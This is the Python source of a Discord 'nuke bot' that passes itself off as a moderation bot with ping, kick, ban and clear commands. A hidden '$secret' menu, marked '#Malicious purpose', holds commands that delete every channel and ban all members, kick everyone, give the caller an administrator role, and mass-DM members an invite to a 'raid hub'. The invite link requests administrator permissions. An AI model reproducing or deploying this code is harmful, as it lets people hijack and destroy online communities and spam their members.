# nuke bot by MEDMEX#7945/MaxDaKing

import discord
from discord.ext import commands
from discord.ext.commands import Bot
import asyncio
import time
import logging

client = commands.Bot(command_prefix='$')

client.remove_command("help")


@client.event
async def on_ready():
    print ("Lets do some damage")

@client.event
async def on_server_join(server):
    print("Joining {0}".format(server.name))

@client.command(pass_context=True)
async def help(ctx):
    member = ctx.message.author

    embed = discord.Embed(
        colour = discord.Colour.blue()
    )

    embed.set_author(name='help')
    embed.add_field(name='$ping', value='Gives ping to client (expressed in ms)', inline=False)
    embed.add_field(name='$kick', value='Kicks specified user', inline=False)
    embed.add_field(name='$ban', value='Bans specified user', inline=False)
    embed.add_field(name='$info', value='Gives information of a user', inline=False)
    embed.add_field(name='$invite', value='Returns invite link of the client', inline=False)
    embed.add_field(name='$clear', value='Clears an X amount of messages', inline=False)
    await member.send(embed=embed)

@client.command(pass_context=True)
async def dm(ctx):
    guild = ctx.message.guild
    for member in guild.members:
     await asyncio.sleep(0)
     try:
       await member.send("https://discord.gg/9KNQqRU Join the server to join us in future raids.")
       print("Sent message")
     except:
       pass

@client.command(pass_context=True)
async def clear(ctx, amount=10):
    member = ctx.message.author
    channel = ctx.message.channel
    messages = []
    async for message in channel.history(limit=int(amount)):
        messages.append(message)
    await channel.delete_messages(messages)
    await channel.send('Messages deleted')

@client.command(pass_context=True)
async def ping(ctx):
	channel = ctx.message.channel
	t1 = time.perf_counter()
	await channel.trigger_typing()
	t2 = time.perf_counter()
	embed=discord.Embed(title=None, description='Ping: {}'.format(round((t2-t1)*1000)), color=0x2874A6)
	await channel.send(embed=embed)

@client.command(pass_context=True)
async def info(ctx, member: discord.Member=None):
    channel = ctx.message.channel
    if member is None:
        await channel.send('Please input a user.')
    else:
        await channel.send("**The user's name is: {}**".format(member.name) + "\n**The user's ID is: {}**".format(member.id) + "\n**The user's current status is: {}**".format(member.status) + "\n**The user's highest role is: {}**".format(member.top_role) + "\n**The user joined at: {}**".format(member.joined_at))

@client.command(pass_context=True)
async def kick(ctx, member: discord.Member=None):
    author = ctx.message.author
    channel = ctx.message.channel
    if author.guild_permissions.kick_members:
        if member is None:
            await channel.send('Please input a user.')
        else:
            await channel.send(":boot: Get kicked **{}**, Damn kid".format(member.name))
            await member.kick()
    else:
        await channel.send('You lack permission to perform this action')

@client.command(pass_context=True)
async def ban(ctx, member: discord.Member=None):
    author = ctx.message.author
    channel = ctx.message.channel
    if author.guild_permissions.kick_members:
        if member is None:
            await channel.send('Please input a user.')
        else:
            await channel.send("Get banned **{}**, Damn kid".format(member.name))
            await member.ban()
    else:
        await channel.send('You lack permission to perform this action')


@client.command(pass_context=True)
async def invite(ctx):
    channel = ctx.message.channel
    await channel.send("https://discordapp.com/oauth2/authorize?client_id=503182818667659274&permissions=8&redirect_uri=https%3A%2F%2Fdiscordapp.com%2Fapi%2Foauth2%2Fauthorize%3Fclient_id%3D503182818667659274%26redirect_uri%3DMedbot%26response_type%3Dcode%26scope%3Didentify&scope=bot")

#Malicious purpose
@client.command(pass_context=True)
async def secret(ctx):
    member = ctx.message.author
    embed = discord.Embed(
        colour = discord.Colour.blue()
    )

    embed.set_author(name='secret')
    embed.add_field(name='$rape', value='Deletes all channels and bans everyone (bot needs manage channels and banning perms)', inline=False)
    embed.add_field(name='$h', value='Kicks everyone from the server (bot needs kicking perms)', inline=False)
    embed.add_field(name='$dab', value='Gives you admin access (bot needs administrator)', inline=False)
    embed.add_field(name='$dm', value='Sends an invite link of the raid hub to everybody in the server', inline=False)
    await member.send(embed=embed)

@client.command(pass_context=True)
async def h(ctx):
        for member in list(ctx.message.guild.members):
            try:
                await guild.kick(member)
                print ("User " + member.name + " has been kicked from ")
            except:
                pass
        print ("Action Completed: kall")

@client.command(pass_context=True)
async def rape(ctx):
        for channel in list(ctx.message.guild.channels):
            try:
                await channel.delete()
                print (channel.name + " has been deleted")
            except:
                pass
        guild = ctx.message.guild
        channel = await guild.create_text_channel( 'RIP')
        await channel.send( "Now that's alot of damage!!")
        for member in list(ctx.message.guild.members):
            try:
                await guild.ban(member)
                print ("User " + member.name + " has been banned")
            except:
                pass
        print ("Now that's alot of damage")

@client.command(pass_context=True)
async def dab(ctx):
    guild = ctx.message.guild
    perms = discord.Permissions(8)
    await guild.create_role(name='dab', permissions=perms)
    member = ctx.message.author
    role = discord.utils.get(guild.roles, name="dab")
    await member.add_roles(role)
    print ("You're in buddy, now don't fuck it up")

client.run("")
